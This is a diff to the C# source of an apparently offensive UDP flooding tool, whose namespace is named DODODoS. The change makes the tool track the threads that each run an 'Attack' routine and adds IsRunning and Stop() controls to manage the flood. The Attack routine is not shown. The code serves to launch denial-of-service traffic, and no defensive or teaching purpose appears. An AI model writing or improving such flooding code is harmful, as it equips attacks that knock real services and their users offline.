@@ -1,14 +1,20 @@
 ﻿using System;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
+using System.Collections.Generic;
 
 namespace DODODoS
 {
     public class UDP
     {
         UdpClient client;
+        List<Thread> workers = new List<Thread>();
+        bool isRunning;
+        public bool IsRunning
+        {
+            get { return isRunning; }
+        }
         public UDP()
         {
             client = new UdpClient();
@@ -42,8 +48,20 @@ namespace DODODoS
                     }
             else
                 for (int i = 0; i < thread; i++)
-                    new Thread(() => Attack(message, 1)).Start();
+                {
+                    Thread tmp = new Thread(() => Attack(message, 1));
+                    tmp.Start();
+                    workers.Add(tmp);
+                    isRunning = true;
+                }
             return true;
+        }
+
+        public void Stop()
+        {
+            foreach (Thread worker in workers)
+                worker.Abort();
+            isRunning = false;
         }
     }
 }
